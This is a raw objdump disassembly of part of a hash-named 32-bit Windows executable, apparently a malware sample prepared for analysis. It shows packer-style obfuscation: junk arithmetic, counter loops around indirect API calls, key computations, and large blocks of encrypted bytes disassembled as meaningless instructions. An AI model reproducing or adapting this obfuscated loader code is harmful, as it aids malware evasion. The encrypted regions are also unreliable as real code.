
20d6d8f48cbf3c5dbd2d956f21d555f75ad8fe0e3c0d607ebcc14e9cec56d278.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	sbb    DWORD PTR ds:0x43470b,ecx
  40100c:	mov    eax,ds:0x414afe
  401011:	mov    eax,DWORD PTR [eax+0x198]
  401017:	mov    DWORD PTR [ebp-0x8],eax
  40101a:	add    eax,DWORD PTR ds:0x4345e3
  401020:	mov    eax,DWORD PTR [ebp+0x8]
  401023:	dec    DWORD PTR ds:0x434653
  401029:	mov    ecx,DWORD PTR [ebp-0x8]
  40102c:	sbb    DWORD PTR ds:0x4345f3,0x434647
  401036:	push   ebx
  401037:	push   esi
  401038:	sub    DWORD PTR ds:0x43470b,ebx
  40103e:	mov    esi,0x7510851
  401043:	mov    DWORD PTR ds:0x43463b,0x10
  40104d:	cmp    DWORD PTR ds:0x43463b,0x0
  401054:	je     0x4010ad
  40105a:	cmp    DWORD PTR ds:0x43463b,0x2
  401061:	jne    0x40107b
  401067:	push   DWORD PTR [ebp-0x1c]
  40106a:	push   DWORD PTR [ebp-0x18]
  40106d:	push   DWORD PTR [ebp-0x24]
  401070:	push   0x7fb5
  401075:	call   DWORD PTR ds:0x4130b4
  40107b:	cmp    DWORD PTR ds:0x43463b,0x3
  401082:	jne    0x401095
  401088:	mov    ebx,DWORD PTR ds:0x43463b
  40108e:	dec    ebx
  40108f:	mov    DWORD PTR ds:0x43463b,ebx
  401095:	mov    ebx,DWORD PTR ds:0x43463b
  40109b:	dec    ebx
  40109c:	mov    DWORD PTR ds:0x43463b,ebx
  4010a2:	jmp    0x40104d
  4010a7:	adc    DWORD PTR ds:0x43470f,ecx
  4010ad:	xor    eax,esi
  4010af:	push   edi
  4010b0:	mov    edi,DWORD PTR ds:0x43465f
  4010b6:	mov    ebx,DWORD PTR ds:0x434733
  4010bc:	sub    ebx,edi
  4010be:	imul   edi,DWORD PTR [edi+ebx*1]
  4010c2:	mov    edi,0x327299
  4010c7:	adc    DWORD PTR ds:0x434607,0x43468b
  4010d1:	add    eax,edi
  4010d3:	and    DWORD PTR ds:0x43468f,0x0
  4010dd:	jmp    0x4010ef
  4010e2:	mov    ebx,DWORD PTR ds:0x43468f
  4010e8:	inc    ebx
  4010e9:	mov    DWORD PTR ds:0x43468f,ebx
  4010ef:	cmp    DWORD PTR ds:0x43468f,0x1d
  4010f6:	jae    0x401312
  4010fc:	cmp    DWORD PTR ds:0x43468f,0xe
  401103:	jne    0x401119
  401109:	push   0x4345eb
  40110e:	push   0x43495b
  401113:	call   DWORD PTR ds:0x41332c
  401119:	cmp    DWORD PTR ds:0x43468f,0xd
  401120:	jne    0x401133
  401126:	mov    ebx,DWORD PTR ds:0x43468f
  40112c:	inc    ebx
  40112d:	mov    DWORD PTR ds:0x43468f,ebx
  401133:	jmp    0x4010e2
  401138:	or     DWORD PTR ds:0x4345eb,ebx
  40113e:	jmp    0x401312
  401143:	test   ah,ch
  401145:	push   edx
  401146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401147:	jb     0x4010fd
  401149:	jl     0x401137
  40114b:	pop    eax
  40114c:	or     eax,0x95e51829
  401151:	adc    DWORD PTR [ebp+0x7e7e7e7e],0xffffffb5
  401158:	jg     0x4011d8
  40115a:	jle    0x40112a
  40115c:	xlat   BYTE PTR ds:[ebx]
  40115d:	cmp    ecx,edx
  40115f:	(bad)
  401162:	(bad)  
  401164:	pop    es
  401165:	add    BYTE PTR [ebx],al
  401167:	push   cs
  401168:	push   edx
  401169:	or     al,0xf
  40116b:	xor    ecx,DWORD PTR [edi]
  40116d:	int3   
  40116e:	and    al,0xc7
  401170:	sbb    al,0x1f
  401172:	inc    ebp
  401173:	fs or  al,0xb7
  401176:	(bad)  [esi]
  401178:	out    dx,eax
  401179:	mov    ecx,0x8e03d6db
  40117e:	es mov esi,0x114da2f0
  401184:	test   eax,0x661f46de
  401189:	call   0x985d1cfd
  40118e:	add    al,0xd6
  401190:	dec    esp
  401191:	stos   BYTE PTR es:[edi],al
  401192:	push   ebx
  401193:	sub    ebp,ebx
  401195:	sar    BYTE PTR [eax],0xa9
  401198:	mov    bh,BYTE PTR [ebx-0x3f]
  40119b:	stos   DWORD PTR es:[edi],eax
  40119c:	push   es
  40119d:	rcl    bl,0x8d
  4011a0:	test   esi,edx
  4011a2:	pushf  
  4011a3:	(bad)
  4011a6:	mov    esi,ebp
  4011a8:	dec    edi
  4011a9:	out    0xa6,al
  4011ab:	dec    ebp
  4011ac:	call   DWORD PTR [edi-0x254af85c]
  4011b2:	mov    ecx,0x5136e949
  4011b7:	and    esi,DWORD PTR [edx-0x47619116]
  4011bd:	jnp    0x4011dc
  4011bf:	ret    
  4011c0:	xchg   edx,eax
  4011c1:	sub    eax,0xc25eebd0
  4011c6:	loopne 0x40120c
  4011c8:	cld    
  4011c9:	jmp    0xd761:0x70cf3d92
  4011d0:	sub    al,0xc9
  4011d2:	add    ah,ch
  4011d4:	sbb    eax,0x331a65d
  4011d9:	outs   dx,DWORD PTR ds:[esi]
  4011da:	ins    DWORD PTR es:[edi],dx
  4011db:	add    al,0x14
  4011dd:	cmp    eax,0x34508ed9
  4011e2:	jno    0x401263
  4011e4:	(bad)
  4011e9:	or     ebx,DWORD PTR [ebx+0x51]
  4011ec:	(bad)  
  4011ee:	adc    eax,0x25e558d3
  4011f3:	jge    0x401193
  4011f5:	inc    esi
  4011f6:	dec    ebx
  4011f7:	aaa    
  4011f8:	adc    DWORD PTR [ebx],ebp
  4011fa:	ja     0x401231
  4011fc:	sbb    dl,bl
  4011fe:	ds dec edi
  401200:	hlt    
  401201:	leave  
  401202:	mov    al,ds:0x9bc41213
  401207:	shr    DWORD PTR [edi-0x55],cl
  40120a:	fild   QWORD PTR [edx+eax*8-0x21aa59af]
  401211:	sub    DWORD PTR [edx*4+0x683f0b92],esi
  401218:	mov    ebp,0xeec29aca
  40121d:	cmp    esi,DWORD PTR [ecx-0x6f765c27]
  401223:	mov    dh,0x9d
  401225:	pop    es
  401226:	icebp  
  401227:	popa   
  401228:	rol    BYTE PTR [bx],1
  40122b:	nop
  40122c:	jne    0x401245
  40122e:	stos   BYTE PTR es:[edi],al
  40122f:	dec    ebx
  401230:	cmp    BYTE PTR [eax-0x2c1fe36c],ah
  401236:	dec    ebx
  401237:	lahf   
  401238:	stc    
  401239:	mov    esi,DWORD PTR [edi-0x52ca44e2]
  40123f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401240:	jns    0x40125e
  401242:	out    dx,al
  401243:	mov    al,0x2f
  401245:	jle    0x401266
  401247:	add    eax,0xe00d0ba0
  40124c:	dec    ebx
  40124d:	add    DWORD PTR [ebp-0x71],ebp
  401250:	in     eax,0xa8
  401252:	mov    ebp,0x88759c7d
  401257:	(bad)  
  401258:	stc    
  401259:	sub    DWORD PTR [esi+0x77],0x6fb99d4f
  401260:	ss push sp
  401263:	leave  
  401264:	jbe    0x401204
  401266:	test   al,0xf8
  401268:	xchg   DWORD PTR [ecx-0x30765036],esp
  40126e:	outs   dx,BYTE PTR ds:[esi]
  40126f:	xor    eax,0x60305559
  401274:	or     esp,0x4304c9dd
  40127a:	mov    ecx,0xf45883e7
  40127f:	imul   ecx,DWORD PTR [ebx-0x10],0xf3182c5
  401286:	loope  0x401297
  401288:	repz (bad) 
  40128a:	sub    DWORD PTR [ebx],esp
  40128c:	or     edx,esp
  40128e:	jge    0x4012af
  401290:	jne    0x40130e
  401292:	mov    ds:0xed4a5403,al
  401297:	sbb    edx,DWORD PTR [eax+ebx*4+0x44]
  40129b:	mov    al,ds:0x28c4b37e
  4012a0:	mov    fs,WORD PTR [ecx-0x6a]
  4012a3:	enter  0x3c79,0xee
  4012a7:	ret    0xf813
  4012aa:	repz in al,dx
  4012ac:	lods   al,BYTE PTR ds:[esi]
  4012ad:	fadd   st(2),st
  4012af:	in     eax,0xf4
  4012b1:	pop    ebp
  4012b2:	lods   al,BYTE PTR ds:[esi]
  4012b3:	iret   
  4012b4:	xor    bl,cl
  4012b6:	fistp  QWORD PTR [ecx-0x37]
  4012b9:	sahf   
  4012ba:	push   edi
  4012bb:	jmp    0x8388:0xb14798ac
  4012c2:	jl     0x4012b5
  4012c4:	pop    ebx
  4012c5:	mov    esp,0x3f951726
  4012ca:	sar    DWORD PTR [edi+0x60302e7b],1
  4012d0:	pop    esi
  4012d1:	add    ebp,esp
  4012d3:	sbb    DWORD PTR [edi],0xa6802d1d
  4012d9:	test   eax,0xf7c588a8
  4012de:	xchg   esp,eax
  4012df:	jl     0x401282
  4012e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012e2:	sub    BYTE PTR [edx+0x4c933e62],bh
  4012e8:	fdivr  QWORD PTR [edx+0x23]
  4012eb:	test   eax,0xf93a6c9
  4012f0:	add    cl,BYTE PTR [edi]
  4012f2:	iret   
  4012f3:	mov    ds:0x160157f0,eax
  4012f8:	xor    ecx,edx
  4012fa:	push   ebp
  4012fb:	cdq    
  4012fc:	mov    ebp,0x8986399e
  401301:	fadd   st(1),st
  401303:	int    0x85
  401305:	mov    DWORD PTR ds:0x8dd922e3,esi
  40130b:	xor    cl,BYTE PTR ds:0xa56b455a
  401311:	push   ebx
  401312:	mov    DWORD PTR [ecx],eax
  401314:	adc    ecx,0x1222
  40131a:	lea    eax,[ebp-0x4]
  40131d:	xor    DWORD PTR ds:0x43467f,0x53dc
  401327:	mov    DWORD PTR [ebp-0x10],eax
  40132a:	adc    DWORD PTR ds:0x43463f,edi
  401330:	mov    eax,DWORD PTR [ebp+0x8]
  401333:	or     DWORD PTR ds:0x4345ef,0x4345e3
  40133d:	mov    ecx,DWORD PTR [ebp-0x10]
  401340:	xor    DWORD PTR ds:0x4345f3,ebx
  401346:	xor    eax,esi
  401348:	neg    ebx
  40134a:	add    eax,edi
  40134c:	mov    DWORD PTR [ecx],eax
  40134e:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  401355:	lea    eax,[ebp-0x14]
  401358:	sbb    ecx,ecx
  40135a:	mov    DWORD PTR [ebp-0x20],eax
  40135d:	mov    eax,DWORD PTR [ebp-0x14]
  401360:	mov    ecx,DWORD PTR [ebp-0x20]
  401363:	and    DWORD PTR ds:0x4346c3,0x0
  40136d:	xor    ebx,ebx
  40136f:	add    ebx,DWORD PTR ds:0x4346c3
  401375:	inc    ebx
  401376:	mov    DWORD PTR ds:0x4346c3,ebx
  40137c:	cmp    DWORD PTR ds:0x4346c3,0x9
  401383:	jne    0x401394
  401389:	push   0x3702
  40138e:	call   DWORD PTR ds:0x4130b8
  401394:	cmp    DWORD PTR ds:0x4346c3,0x8
  40139b:	jne    0x4013ae
  4013a1:	mov    ebx,DWORD PTR ds:0x4346c3
  4013a7:	inc    ebx
  4013a8:	mov    DWORD PTR ds:0x4346c3,ebx
  4013ae:	cmp    DWORD PTR ds:0x4346c3,0x1c
  4013b5:	jb     0x40136d
  4013bb:	add    DWORD PTR ds:0x43463f,ecx
  4013c1:	xor    eax,esi
  4013c3:	add    eax,edi
  4013c5:	mov    DWORD PTR [ecx],eax
  4013c7:	dec    DWORD PTR ds:0x43468b
  4013cd:	mov    eax,ds:0x414bd2
  4013d2:	mov    ebx,0x8e12febf
  4013d7:	mov    DWORD PTR [ebp-0xc],ebx
  4013da:	sbb    DWORD PTR ds:0x4345ef,0x43463f
  4013e4:	mov    eax,DWORD PTR [eax]
  4013e6:	adc    DWORD PTR ds:0x4345eb,0x4346f7
  4013f0:	mov    cx,WORD PTR [ebp-0x4]
  4013f4:	xor    DWORD PTR ds:0x434603,0x1391
  4013fe:	movzx  ecx,cx
  401401:	add    ecx,DWORD PTR [eax]
  401403:	mov    DWORD PTR [ebp-0x18],ecx
  401406:	jmp    0x4015da
  40140b:	fisub  DWORD PTR [esi]
  40140d:	add    BYTE PTR [ecx],0x42
  401410:	lods   eax,DWORD PTR ds:[esi]
  401411:	gs in  eax,dx
  401413:	aam    0x1e
  401415:	dec    edx
  401416:	xchg   ecx,esi
  401418:	inc    ebp
  401419:	in     eax,0x80
  40141b:	mov    ch,0x7f
  40141d:	jle    0x40149d
  40141f:	mov    ch,0x7f
  401421:	jle    0x4014a1
  401423:	test   BYTE PTR [edx+0x16966a02],ah
  401429:	mov    eax,ds:0xb153f609
  40142e:	mov    edi,0xc3fd6805
  401433:	inc    esi
  401434:	fsub   st(3),st
  401436:	clc    
  401437:	mov    ecx,0xcdeda52c
  40143c:	xchg   ebx,eax
  40143d:	add    al,0xd0
  40143f:	or     BYTE PTR [esp+eax*1],0xa4
  401443:	xchg   edx,eax
  401444:	mov    edi,0xd24bc9bb
  401449:	out    dx,eax
  40144a:	test   al,0x8c
  40144c:	jbe    0x4013da
  40144e:	outs   dx,BYTE PTR ds:[esi]
  40144f:	aas    
  401450:	mov    ds:0xcc174705,eax
  401455:	adc    ebx,ebx
  401457:	pop    edi
  401458:	jmp    0x401470
  40145a:	out    0x9c,eax
  40145c:	imul   ebx,DWORD PTR [eax+0x2c],0x4a081f3b
  401463:	imul   edi,DWORD PTR ds:0x1bf6c258,0x5059c744
  40146d:	jbe    0x4014c8
  40146f:	or     BYTE PTR [ebp-0x1a],cl
  401472:	enter  0x749b,0xfb
  401476:	adc    al,0x3a
  401478:	adc    DWORD PTR [ebx-0xd],ecx
  40147b:	das    
  40147c:	or     eax,0xd8fc6d3e
  401481:	and    eax,DWORD PTR [ebx]
  401483:	mov    al,ds:0xc7f7cf2f
  401488:	fdiv   st,st(1)
  40148a:	ss dec esp
  40148c:	in     al,dx
  40148d:	jae    0x401501
  40148f:	or     dl,BYTE PTR [ebp+0x5f]
  401492:	ror    eax,0x55
  401495:	push   ebp
  401496:	daa    
  401497:	ss mov bh,ch
  40149a:	out    dx,eax
  40149b:	hlt    
  40149c:	xchg   ebx,eax
  40149d:	mov    edx,DWORD PTR [ecx-0x1]
  4014a0:	xor    ebp,DWORD PTR [eax-0xa]
  4014a3:	mov    esi,0x19e3fd01
  4014a8:	fild   QWORD PTR [eax]
  4014aa:	aad    0x47
  4014ac:	popa   
  4014ad:	jmp    0x401492
  4014af:	sbb    sp,di
  4014b2:	into   
  4014b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4014b4:	in     eax,0x6b
  4014b6:	inc    ebp
  4014b7:	scas   eax,DWORD PTR es:[edi]
  4014b8:	xchg   esp,eax
  4014b9:	pop    esi
  4014ba:	mov    edi,0x72d599ff
  4014bf:	ins    BYTE PTR es:[edi],dx
  4014c0:	xchg   ebp,eax
  4014c1:	push   esp
  4014c2:	fdivr  QWORD PTR [edx+0x22]
  4014c5:	jg     0x4014a0
  4014c7:	jo     0x40151c
  4014c9:	add    al,0x1
  4014cb:	loop   0x401528
  4014cd:	das    
  4014ce:	xor    dh,BYTE PTR [esi-0x52]
  4014d1:	mov    cs,WORD PTR [ecx+0xa54ba48]
  4014d7:	or     edi,0x80737e55
  4014dd:	outs   dx,BYTE PTR ds:[esi]
  4014de:	mov    eax,0xbb2033e1
  4014e3:	ficomp DWORD PTR [esi-0x2c]
  4014e6:	sar    DWORD PTR [esi+0x2a],cl
  4014e9:	nop
  4014ea:	adc    dh,BYTE PTR [ebx-0x2943e68e]
  4014f0:	ffree  st(6)
  4014f2:	les    ebp,FWORD PTR [esi+0x2111a273]
  4014f8:	test   DWORD PTR [ebp+0x3f],0xd738ba4b
  4014ff:	out    0xa0,al
  401501:	jb     0x4014d3
  401503:	xor    eax,0xd96940eb
  401508:	push   ebp
  401509:	dec    esp
  40150a:	pusha  
  40150b:	shl    DWORD PTR [edi+0x74],cl
  40150e:	lds    ebp,FWORD PTR ds:0x4d810750
  401514:	pop    eax
  401515:	adc    BYTE PTR [ebx+0x69],bh
  401518:	sub    ah,bl
  40151a:	in     eax,dx
  40151b:	xor    ch,BYTE PTR [ecx+0x5881852e]
  401521:	imul   edx,edx,0x3bdf9ee0
  401527:	xchg   ebx,eax
  401528:	lods   al,BYTE PTR ds:[esi]
  401529:	shr    bl,1
  40152b:	mov    dl,0xde
  40152d:	ret    0x467d
  401530:	pop    esp
  401531:	sub    cl,ah
  401533:	push   ecx
  401534:	xchg   esi,eax
  401535:	xchg   edx,eax
  401536:	xor    dh,dh
  401538:	leave  
  401539:	mov    ds:0xf7748b3b,eax
  40153e:	rcl    BYTE PTR [eax],cl
  401540:	and    BYTE PTR gs:[esi+edx*4+0x4f794dec],cl
  401548:	add    eax,0x6400a1de
  40154d:	gs into 
  40154f:	lock xor ebp,DWORD PTR [edi]
  401552:	int3   
  401553:	or     eax,0x97a71cd8
  401558:	test   DWORD PTR [eax+0x58],esp
  40155b:	js     0x40150f
  40155d:	out    0xd3,eax
  40155f:	ins    BYTE PTR es:[edi],dx
  401560:	fmul   QWORD PTR [ecx+esi*2+0x76]
  401564:	xlat   BYTE PTR ds:[ebx]
  401565:	xchg   esi,eax
  401566:	int3   
  401567:	add    edx,DWORD PTR [edi+0x10f15e06]
  40156d:	retf   0xed8f
  401570:	jl     0x401534
  401572:	rol    DWORD PTR [ecx+0x59],cl
  401575:	xchg   ecx,eax
  401576:	jg     0x4015a4
  401578:	pop    ebx
  401579:	ss ss cmp al,0x18
  40157d:	stc    
  40157e:	lds    esp,FWORD PTR [edx-0x5d]
  401581:	ret    
  401582:	std    
  401583:	push   esp
  401584:	push   ss
  401585:	jns    0x401571
  401587:	call   0xd3f7:0x2e831d3b
  40158e:	jae    0x40158b
  401590:	data16 jnp 0x4015e7
  401593:	xor    eax,0xe528bd1c
  401598:	sub    DWORD PTR [esi-0x3],edi
  40159b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40159c:	jno    0x401522
  40159e:	push   esp
  40159f:	aaa    
  4015a0:	sbb    ebp,0x49815564
  4015a6:	lods   eax,DWORD PTR ds:[esi]
  4015a7:	fsub   DWORD PTR [esi-0x4cd380b6]
  4015ad:	jmp    0x4015c6
  4015af:	adc    bl,bl
  4015b1:	shr    BYTE PTR [ecx+ebx*8+0x389b7512],0xd1
  4015b9:	addr16 xchg ebx,eax
  4015bb:	or     eax,0x5fd9d3ec
  4015c0:	fdiv   st,st(2)
  4015c2:	pop    ss
  4015c3:	inc    edi
  4015c4:	or     ecx,edx
  4015c6:	sbb    BYTE PTR [edi],bl
  4015c8:	fistp  DWORD PTR [ecx-0x5c]
  4015cb:	js     0x4015c9
  4015cd:	popa   
  4015ce:	add    ebp,esi
  4015d0:	add    edi,eax
  4015d2:	pop    es
  4015d3:	loop   0x401588
  4015d5:	lods   al,BYTE PTR ds:[esi]
  4015d6:	inc    edx
  4015d7:	sti    
  4015d8:	jmp    0x885a0fb
  4015dd:	mov    ecx,DWORD PTR ds:0x43470f
  4015e3:	and    DWORD PTR ds:0x4346bf,ecx
  4015e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4015ec:	xor    eax,esi
  4015ee:	add    DWORD PTR ds:0x4345e3,0x598
  4015f8:	add    eax,edi
  4015fa:	mov    DWORD PTR ds:0x434643,0x7c6b
  401604:	cmp    DWORD PTR [ecx],eax
  401606:	mov    DWORD PTR ds:0x434693,0x6dd9
  401610:	jne    0x40227a
  401616:	and    DWORD PTR ds:0x434683,0x0
  401620:	mov    ecx,DWORD PTR ds:0x434683
  401626:	inc    ecx
  401627:	mov    DWORD PTR ds:0x434683,ecx
  40162d:	cmp    DWORD PTR ds:0x434683,0x4
  401634:	jne    0x401645
  40163a:	push   0x2f81
  40163f:	call   DWORD PTR ds:0x413270
  401645:	cmp    DWORD PTR ds:0x434683,0x3
  40164c:	jne    0x40165f
  401652:	mov    ecx,DWORD PTR ds:0x434683
  401658:	inc    ecx
  401659:	mov    DWORD PTR ds:0x434683,ecx
  40165f:	cmp    DWORD PTR ds:0x434683,0x14
  401666:	jb     0x401620
  40166c:	xor    ecx,ecx
  40166e:	or     ecx,DWORD PTR ds:0x434623
  401674:	mov    eax,ds:0x43466b
  401679:	sub    eax,ecx
  40167b:	and    ecx,DWORD PTR [ecx+eax*1]
  40167e:	mov    eax,DWORD PTR [ebp+0x8]
  401681:	mov    ecx,DWORD PTR [ebp-0x18]
  401684:	add    DWORD PTR ds:0x4346cb,0x4346f7
  40168e:	xor    eax,esi
  401690:	or     DWORD PTR ds:0x4345eb,0x526e
  40169a:	add    eax,edi
  40169c:	mov    DWORD PTR ds:0x4345ef,0x6068
  4016a6:	cmp    DWORD PTR [ecx],eax
  4016a8:	jmp    0x40187c
  4016ad:	cmp    dh,BYTE PTR [esi]
  4016af:	sub    eax,0x6255fdb9
  4016b4:	mov    ebp,0xf85a51d5
  4016b9:	loop   0x40168f
  4016bb:	es mov ah,ch
  4016be:	jns    0x40173e
  4016c0:	jle    0x401677
  4016c2:	jg     0x401742
  4016c4:	jle    0x401736
  4016c6:	ret    0x97c2
  4016c9:	push   eax
  4016ca:	into   
  4016cb:	lds    eax,FWORD PTR [bx+si]
  4016ce:	sub    DWORD PTR [ebx+0x27d67989],esi
  4016d4:	push   esi
  4016d5:	dec    esp
  4016d6:	add    eax,0x71ffef41
  4016db:	and    esi,ebp
  4016dd:	daa    
  4016de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016e0:	adc    cl,BYTE PTR [ecx]
  4016e2:	mov    al,BYTE PTR [edi-0x453e7292]
  4016e8:	jl     0x4016dd
  4016ea:	mov    DWORD PTR [edi+eiz*1],ecx
  4016ed:	cld    
  4016ee:	jp     0x401742
  4016f0:	xlat   BYTE PTR ds:[ebx]
  4016f1:	mov    ebp,ebp
  4016f3:	and    esp,DWORD PTR [esi]
  4016f5:	xchg   ebp,eax
  4016f6:	lock nop
  4016f8:	and    al,bh
  4016fa:	mov    cl,0x84
  4016fc:	addr16 (bad) 
  4016fe:	cli    
  4016ff:	push   esi
  401700:	ja     0x4016e7
  401702:	add    eax,0x3720fe9b
  401707:	jo     0x4016ab
  401709:	imul   ebp,DWORD PTR [edx],0xffffffd3
  40170c:	push   cs
  40170d:	xor    eax,0x1fa789af
  401712:	ins    DWORD PTR es:[edi],dx
  401713:	inc    ebx
  401714:	loopne 0x4016eb
  401716:	cwde   
  401717:	xor    BYTE PTR [eax+0xa],al
  40171a:	jle    0x401746
  40171c:	dec    ecx
  40171d:	aam    0xc0
  40171f:	jecxz  0x401712
  401721:	lods   al,BYTE PTR ds:[esi]
  401722:	aad    0x24
  401724:	inc    ebp
  401725:	sub    bh,bl
  401727:	fimul  WORD PTR [eax+ebp*2]
  40172a:	rcr    eax,cl
  40172c:	fwait
  40172d:	loope  0x4016f9
  40172f:	loopne 0x4016dd
  401731:	retf   0x68dd
  401734:	lea    edi,[ebx-0x5e]
  401737:	cli    
  401738:	bts    DWORD PTR [ebx+0x2d],edi
  40173c:	stc    
  40173d:	ja     0x401755
  40173f:	mov    ebp,0xcd1c1eb3
  401744:	add    BYTE PTR [ebx+0x2030fca6],bh
  40174a:	add    DWORD PTR [eax],edx
  40174c:	xchg   esp,eax
  40174d:	sub    dl,BYTE PTR [ebp-0x4f]
  401750:	sbb    DWORD PTR [ecx+edx*4],edx
  401753:	int3   
  401754:	jge    0x4017c8
  401756:	dec    esi
  401757:	pop    ecx
  401758:	push   0xa1036b3b
  40175d:	loopne 0x401794
  40175f:	and    ch,BYTE PTR [ebx+0x6f]
  401762:	mov    al,0x3f
  401764:	jmp    0x40172b
  401766:	retf   0x2f3f
  401769:	out    dx,eax
  40176a:	fadd   DWORD PTR [ebp+edx*8+0x1a]
  40176e:	and    bh,BYTE PTR [ebp+0x65b2f2d7]
  401774:	std    
  401775:	sar    BYTE PTR [esi-0x7ec306f7],0x6c
  40177c:	popf   
  40177d:	in     eax,dx
  40177e:	retf   
  40177f:	(bad)  
  401780:	fadd   st,st(3)
  401782:	push   es
  401783:	fimul  DWORD PTR [ebx]
  401785:	psubq  mm5,QWORD PTR [edx+0x3e]
  401789:	lahf   
  40178a:	ss xor al,cl
  40178d:	jecxz  0x401795
  40178f:	jns    0x4017a0
  401791:	stos   DWORD PTR es:[edi],eax
  401792:	xchg   DWORD PTR [ebx+ebx*4+0x31],esp
  401796:	cld    
  401797:	xor    eax,0xb999a214
  40179c:	dec    ebp
  40179d:	(bad)  
  40179e:	mov    ah,0x79
  4017a0:	in     al,0x69
  4017a2:	aas    
  4017a3:	mov    cl,0xea
  4017a5:	out    dx,eax
  4017a6:	ins    DWORD PTR es:[edi],dx
  4017a7:	outs   dx,BYTE PTR ds:[esi]
  4017a8:	ins    DWORD PTR es:[edi],dx
  4017a9:	jo     0x40179f
  4017ab:	xlat   BYTE PTR ds:[ebx]
  4017ac:	jns    0x40180f
  4017ae:	dec    esi
  4017af:	push   esi
  4017b0:	inc    esi
  4017b1:	lods   eax,DWORD PTR ds:[esi]
  4017b2:	xchg   esi,eax
  4017b3:	(bad)  
  4017b4:	mov    esi,0xf58b4a80
  4017b9:	adc    DWORD PTR [eax-0x56],ecx
  4017bc:	loope  0x40182f
  4017be:	fbld   TBYTE PTR [edx+0x7436d320]
  4017c4:	xchg   esp,eax
  4017c5:	frstor [eax+ebp*1]
  4017c8:	sbb    edi,ecx
  4017ca:	pop    eax
  4017cb:	xor    eax,0x80cb262
  4017d0:	inc    ebx
  4017d1:	fisub  WORD PTR [eax+esi*4-0x4564de27]
  4017d8:	cli    
  4017d9:	ret    0x4954
  4017dc:	aam    0x4b
  4017de:	push   0x2e
  4017e0:	sub    bh,BYTE PTR [edx+0x7]
  4017e3:	pusha  
  4017e4:	sbb    DWORD PTR [esi],edi
  4017e6:	les    ebx,FWORD PTR [edi-0x4d]
  4017e9:	mov    al,ds:0x4d78a1b7
  4017ee:	rcl    BYTE PTR [eax+0x72],0x67
  4017f2:	mov    dl,BYTE PTR [esi-0x4568fe9]
  4017f8:	call   0x567e191d
  4017fd:	push   ebx
  4017fe:	in     eax,dx
  4017ff:	icebp  
  401800:	js     0x401871
  401802:	jne    0x401842
  401804:	js     0x40183b
  401806:	sti    
  401807:	test   al,0x84
  401809:	dec    ebp
  40180a:	mov    BYTE PTR [ecx-0x6d],ah
  40180d:	mov    ah,0xdb
  40180f:	test   BYTE PTR [edx+eax*1-0x7f868e6b],al
  401816:	lods   eax,DWORD PTR ds:[esi]
  401817:	xor    edi,DWORD PTR [ebx-0x15bcd5e3]
  40181d:	dec    ecx
  40181e:	aaa    
  40181f:	sub    eax,0x94fb621e
  401824:	sbb    ecx,0x88be5435
  40182a:	popa   
  40182b:	(bad)  [ebx+esi*4]
  40182e:	xlat   BYTE PTR ds:[ebx]
  40182f:	mov    ch,0x73
  401831:	xor    eax,0xb093044e
  401836:	lea    ebp,[edi+0x68]
  401839:	popa   
  40183a:	std    
  40183b:	les    eax,FWORD PTR [ebx+eax*8]
  40183e:	xlat   BYTE PTR ds:[ebx]
  40183f:	xor    ch,BYTE PTR [ebx]
  401841:	sub    cl,BYTE PTR [edi]
  401843:	in     eax,0x26
  401845:	scas   eax,DWORD PTR es:[edi]
  401846:	mov    esi,0xc3a8da1
  40184b:	mov    gs,WORD PTR [edi-0x57ead72f]
  401851:	jo     0x4017f9
  401853:	fidivr WORD PTR [esi-0x50984ef3]
  401859:	and    ecx,eax
  40185b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40185c:	xor    al,0x15
  40185e:	fcmovne st,st(2)
  401860:	or     BYTE PTR [edi+eax*1+0x516eba1b],0xe6
  401868:	mov    bh,BYTE PTR [edi]
  40186a:	mov    ebx,0x43a0540e
  40186f:	and    eax,0xae151e23
  401874:	xor    eax,0xa10e2eb4
  401879:	rcl    bl,0xbb
  40187c:	jne    0x401ca9
  401882:	mov    ecx,DWORD PTR ds:0x434703
  401888:	or     DWORD PTR ds:0x4345e3,ecx
  40188e:	jmp    0x401a62
  401893:	or     esi,DWORD PTR [edi+eiz*2-0x2a]
  401897:	popa   
  401898:	(bad)  [ebx+0x728b6c7d]
  40189e:	sbb    BYTE PTR [ebx+0x1b07a21a],ah
  4018a4:	jnp    0x401924
  4018a6:	jle    0x40185d
  4018a8:	jg     0x401928
  4018aa:	jle    0x4018a3
  4018ac:	call   DWORD PTR [esi+0x22]
  4018af:	lahf   
  4018b0:	les    edx,FWORD PTR ds:0x5889c6a7
  4018b6:	adc    DWORD PTR ds:0x8cebbf46,edi
  4018bc:	jns    0x4018a7
  4018be:	mov    esi,0x34387d19
  4018c3:	jno    0x401932
  4018c5:	cmp    al,0xe5
  4018c7:	inc    ebp
  4018c8:	inc    ebp
  4018c9:	pop    ds
  4018ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018cb:	mov    ch,BYTE PTR [eax-0x786018e5]
  4018d1:	stos   BYTE PTR es:[edi],al
  4018d2:	sbb    ecx,edi
  4018d4:	lock or eax,0xa851e7cd
  4018da:	out    dx,al
  4018db:	ss rcl ecx,0x55
  4018df:	mov    edx,0xfe74b756
  4018e4:	or     DWORD PTR [edx],eax
  4018e6:	xchg   edx,eax
  4018e7:	pop    edi
  4018e8:	xchg   BYTE PTR [edx+0x96e8b1e],ch
  4018ee:	pushf  
  4018ef:	adc    BYTE PTR [ecx-0x153ecc33],al
  4018f5:	add    ecx,DWORD PTR [edi-0x1a]
  4018f8:	mov    esp,0x68092b8e
  4018fd:	(bad)
  401900:	cmp    eax,0x1d2331de
  401905:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401906:	push   esp
  401907:	fwait
  401908:	sar    BYTE PTR [esi+0x3],0x6c
  40190c:	into   
  40190d:	dec    ebp
  40190e:	leave  
  40190f:	fnstenv [ebp-0x2b]
  401912:	jp     0x401956
